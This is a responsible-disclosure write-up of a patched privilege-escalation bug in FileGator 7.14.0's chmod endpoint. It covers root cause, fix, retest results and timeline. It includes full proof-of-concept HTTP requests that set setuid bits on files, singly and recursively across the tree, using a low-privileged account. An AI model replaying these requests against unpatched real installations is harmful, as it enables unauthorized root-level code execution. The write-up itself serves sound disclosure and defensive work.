@@ -1,0 +1,331 @@
+---
+title: "FileGator v7.14.0 — Privilege Escalation via Unvalidated chmod Endpoint"
+summary: "A low-privileged authenticated user with the chmod permission could set arbitrary Unix special permission bits (setuid, setgid, sticky) on any file or directory they could reach across all three storage adapters (Local, SFTP, FTP). With one recursive call, the entire repository tree could be flipped to setuid root."
+date: 2026-05-15
+severity: High
+cvss: 8.7
+cwe: "CWE-732"
+product: "FileGator"
+version: "≤ 7.14.0"
+vendor: "filegator/filegator"
+status: "Patched"
+tags: ["privilege-escalation", "input-validation", "php", "responsible-disclosure"]
+advisory: "https://github.com/filegator/filegator/blob/master/CHANGELOG.md"
+order: 1
+featured: true
+type: "Disclosure"
+readingTime: 8
+---
+
+[FileGator](https://github.com/filegator/filegator) is an open-source multi-user file manager
+written in PHP, widely deployed in shared-hosting and self-hosted setups. It supports three
+filesystem adapters out of the box — `Local`, `SFTP`, and `FTP` — and ships with a fine-grained
+permission model (`read`, `write`, `upload`, `download`, `delete`, `chmod`, `zip`, ...) that lets
+administrators grant capabilities on a per-role basis.
+
+The `chmod` capability is intended to be a low-risk file-management primitive: change `0644` to
+`0600`, lock down a directory to `0700`, that sort of thing. In version 7.14.0 it accepted any
+integer the client wanted to send — including values that set the `setuid`, `setgid`, and
+`sticky` bits on the underlying filesystem.
+
+Any user with the `chmod` capability — which by default is granted to the standard `user` role
+— could therefore upload a binary, mark it `4777`, and obtain code execution as the file owner
+on the next invocation. On most deployments that file owner is `www-data` or `root`. The bug
+was reported on **2026-05-15**, patched in **v7.14.2 on 2026-05-18**, and credited in the
+[FileGator changelog](https://github.com/filegator/filegator/blob/master/CHANGELOG.md).
+
+## The endpoint
+
+The vulnerable surface is a single JSON POST:
+
+```http
+POST /index.php?r=/chmoditems HTTP/1.1
+Host: <target>
+Content-Type: application/json
+X-CSRF-Token: <token>
+Cookie: filegator=<session>
+
+{
+  "items":       [{"path":"/exploit_target.sh","type":"file"}],
+  "permissions": "4777",
+  "recursive":   "all"
+}
+```
+
+The two parameters that matter:
+
+- `permissions` — a string the backend will run through `octdec()` and hand straight to PHP's
+  `chmod()`.
+- `recursive` — when set to `"all"` and the item is a directory, the same permission is applied
+  to every file and subdirectory below it.
+
+Standard Unix permission values live in the range `000`–`777`. Anything above that encodes a
+special bit:
+
+| Octal prefix | Bit            | What it means                                                  |
+| ------------ | -------------- | -------------------------------------------------------------- |
+| `4xxx`       | `setuid`       | The executable runs with the file owner's privileges, not the caller's. |
+| `2xxx`       | `setgid`       | Same idea, but for the file's group.                           |
+| `1xxx`       | `sticky`       | Only the file's owner can delete it from the parent directory. |
+| `7xxx`       | all three      | Maximum privilege amplification.                               |
+
+FileGator's `chmod` handler performed **no validation** on the supplied value before passing it
+to the kernel. The PHP `octdec()` function happily converts `"4777"` to decimal `2559`
+(octal `04777`), and `chmod()` happily applies it.
+
+## Reproduction
+
+The complete chain assumes a single low-privilege account on the target installation. No admin
+access, no exotic preconditions.
+
+### Step 1 — Authenticate
+
+```http
+GET /index.php?r=/getuser HTTP/1.1
+→ Response header: X-CSRF-Token: <token>
+
+POST /index.php?r=/login HTTP/1.1
+Content-Type: application/json
+X-CSRF-Token: <token>
+
+{"username":"user","password":"user123"}
+```
+
+The session cookie returned by the login response will be carried for the rest of the chain.
+
+### Step 2 — Drop a payload
+
+A shell script will do for the demonstration, but a compiled binary works the same way. The
+request below creates an empty file via the normal upload path:
+
+```http
+POST /index.php?r=/createnew HTTP/1.1
+Content-Type: application/json
+X-CSRF-Token: <token>
+
+{"type":"file","name":"exploit_target.sh"}
+```
+
+At this point the file exists on disk with mode `644` and owner matching the FileGator process
+user. On a typical install that's `www-data` or `root`.
+
+<figure>
+  <img src="/images/filegator/01-dashboard.png" alt="FileGator authenticated dashboard showing the Permissions column for .gitignore at 644." />
+  <figcaption>Authenticated dashboard — Permissions column is the relevant UI element.</figcaption>
+</figure>
+
+### Step 3 — Flip the setuid bit
+
+```http
+POST /index.php?r=/chmoditems HTTP/1.1
+Content-Type: application/json
+X-CSRF-Token: <token>
+Cookie: filegator=<session>
+
+{
+  "items":       [{"path":"/exploit_target.sh","type":"file"}],
+  "permissions": "4777"
+}
+```
+
+Server response:
+
+```json
+{"data":"Done"}
+```
+
+### Step 4 — Confirm on disk
+
+```bash
+$ ls -la repository/exploit_target.sh
+-rwsrwxrwx 1 root root 48 May 15 18:22 exploit_target.sh
+
+$ stat -c "%a" repository/exploit_target.sh
+4777
+```
+
+The `s` in `-rws...` is the setuid bit. The file is owned by `root`. Anyone who can execute it
+now runs as `root`.
+
+<figure>
+  <img src="/images/filegator/02-before-644.png" alt="FileGator UI listing exploit_target.sh with permissions 644 before the exploit." />
+  <figcaption>Before exploitation — <code>exploit_target.sh</code> is created with mode 644.</figcaption>
+</figure>
+
+<figure>
+  <img src="/images/filegator/03-after-777.png" alt="FileGator UI listing exploit_target.sh with permissions 777 after the exploit." />
+  <figcaption>After the chmoditems call — the UI reads 777, but the on-disk value is actually 4777. FileGator's permission column only renders three digits, so the setuid bit is invisible from the web interface.</figcaption>
+</figure>
+
+<figure>
+  <img src="/images/filegator/04-exploit-summary.png" alt="Terminal-style summary: endpoint, payload, before/after mode, impact bullets, ls -la output." />
+  <figcaption>Summary of the chain — endpoint, payload, before/after, and reachable impact.</figcaption>
+</figure>
+
+<figure>
+  <img src="/images/filegator/05-terminal-proof.png" alt="Terminal output from ls -la and stat -c showing 4777 on exploit_target.sh." />
+  <figcaption><code>stat</code> confirms <code>4777</code>; <code>ls</code> shows the setuid bit (<code>-rwsrwxrwx</code>) on a root-owned file.</figcaption>
+</figure>
+
+## Recursive amplification
+
+The bug is meaningfully worse with `recursive=all`. A single request against the root of any
+directory the user can reach will rewrite every descendant:
+
+```http
+POST /index.php?r=/chmoditems HTTP/1.1
+Content-Type: application/json
+X-CSRF-Token: <token>
+
+{
+  "items":       [{"path":"/","type":"dir"}],
+  "permissions": "4777",
+  "recursive":   "all"
+}
+```
+
+After one call:
+
+```bash
+$ ls -la repository/
+drwsrwxrwx root root 4096 ./
+-rwsrwxrwx root root   12 .gitignore
+-rwsrwxrwx root root   48 exploit_target.sh
+
+$ stat -c "%a %n" repository/*
+4777 repository/.gitignore
+4777 repository/exploit_target.sh
+```
+
+<figure>
+  <img src="/images/filegator/06-recursive-terminal.png" alt="Terminal block showing the recursive chmoditems request and the resulting setuid bit on every file in the repository tree." />
+  <figcaption>One request, full tree flipped to setuid. The complete attack chain is upload → chmod → execute.</figcaption>
+</figure>
+
+## Root cause
+
+The handler lives in `backend/Services/Storage/Filesystem.php`, method `chmodItem()`. At the
+time of disclosure it looked like this:
+
+```php
+public function chmodItem(string $path, int $permissions)
+{
+    $adapter = $this->storage->getAdapter();
+
+    switch (get_class($adapter)) {
+        case 'League\Flysystem\Adapter\Local':
+            $absolutePath = $adapter->applyPathPrefix($path);
+            return chmod($absolutePath, octdec($permissions)); // ← no validation
+
+        case 'League\Flysystem\Sftp\SftpAdapter':
+            return $adapter->getConnection()->chmod($path, octdec($permissions));
+
+        case 'Filegator\Services\Storage\Adapters\FilegatorFtp':
+            return ftp_chmod($adapter->getConnection(), octdec($permissions), $path);
+    }
+}
+```
+
+<figure>
+  <img src="/images/filegator/07-root-cause-code.png" alt="The vulnerable chmodItem method — three switch branches, all calling chmod with octdec(user input) and no bounds check." />
+  <figcaption>The vulnerable code path. The same unchecked input reaches all three storage adapters.</figcaption>
+</figure>
+
+The value flowed end-to-end from the request body:
+
+```
+JSON body → FileController::chmodItems()
+          → Filesystem::chmod()
+          → Filesystem::chmodItem()
+          → chmod() / SFTP chmod / ftp_chmod
+```
+
+There was no bounds check at any layer, and the controller didn't restrict the input type
+beyond "must be a number". All three adapters were equally affected — the bug wasn't a
+property of the Local backend, it was a property of the abstraction over all of them.
+
+## Suggested fix
+
+Reject anything outside the standard Unix range, then reject anything that still has a special
+bit set after the `octdec()` conversion:
+
+```php
+public function chmod(string $path, int $permissions, string $recursive = null)
+{
+    if ($permissions < 0 || $permissions > 777) {
+        throw new \Exception('Invalid permission value. Must be between 000 and 777.');
+    }
+
+    $octalValue = octdec($permissions);
+    if ($octalValue > 0777) {
+        throw new \Exception(
+            'Special permission bits (setuid/setgid/sticky) are not allowed.'
+        );
+    }
+
+    // ... rest of existing code
+}
+```
+
+The patch that shipped in v7.14.2 takes essentially this shape. Once it was in, I re-ran every
+exploit variant against a fresh install:
+
+| Variant                                       | v7.14.0       | v7.14.2 |
+| --------------------------------------------- | ------------- | ------- |
+| `setuid` via `4777`                           | accepted      | blocked |
+| `setgid` via `2777`                           | accepted      | blocked |
+| `sticky` via `1777`                           | accepted      | blocked |
+| All special bits via `7777`                   | accepted      | blocked |
+| Recursive `setuid` on `/`                     | full tree     | blocked |
+| Legitimate `755`, `644`, `600`                | works         | works   |
+
+Functional behaviour is preserved; the exotic codepath is closed.
+
+## A second finding while testing the fix
+
+While retesting, the new validation path was reachable but it surfaced the exception as an
+unhandled PHP fatal error. The full stack trace — including the absolute filesystem path of
+the FileGator install — was returned in the HTTP response body. Not a security control
+bypass, but a useful piece of reconnaissance for a follow-up attack and a real footgun for
+anyone deploying behind a reverse proxy that doesn't strip error pages.
+
+I reported it the same day. The maintainer pushed
+[commit `4a44ed9a`](https://github.com/filegator/filegator/commit/4a44ed9a43f84505703dce669c68fb55270c3f2c)
+later that afternoon to wrap unhandled exceptions and return a generic 500. It shipped in
+v7.14.3.
+
+## Disclosure timeline
+
+| Date                | Event                                                                                  |
+| ------------------- | -------------------------------------------------------------------------------------- |
+| 2026-05-15          | Bug discovered during manual code review. Working PoC the same day. Reported by email. |
+| 2026-05-18          | Vendor confirmed, fix landed in v7.14.2, credit accepted in CHANGELOG.                 |
+| 2026-05-18 (later)  | Stack-trace leakage reported as a follow-up.                                           |
+| 2026-05-18 (evening)| Exception-handling commit (`4a44ed9a`) pushed.                                         |
+| 2026-05-22          | v7.14.3 released with the exception-handling change.                                   |
+
+## Takeaways
+
+A few things worth pulling out of this one:
+
+- **`chmod` is not an innocuous permission.** Anywhere a web application exposes "set file
+  mode" to a user, the input has to be clamped to `0000`–`0777`. The special bits exist for
+  legitimate reasons but the web tier is never the place to grant them.
+- **Treat the abstraction, not the implementation.** The bug existed once in `chmodItem()`
+  and inherited itself into all three storage adapters. Fixing it in `Local` only would have
+  left SFTP and FTP exposed.
+- **`octdec()` is a footgun.** PHP will silently widen `"7777"` to a perfectly valid integer.
+  Validate the string before conversion, or validate the integer after.
+- **The UI hid the impact.** FileGator's permission column rendered three digits. Operators
+  watching their own dashboard would not have seen a `setuid` bit get set.
+
+## Credit
+
+Crediting on this one was straightforward — the maintainer offered a CHANGELOG mention and
+released the fix within three days of the report. The relevant changelog entry:
+
+> **7.14.2 — 2026-05-18**
+> Security fix: validate permission bits when using chmod, reported by Abdul Moiz
+> (https://github.com/moizxsec).
+
+A CVE request has been submitted; it will be linked here once assigned.
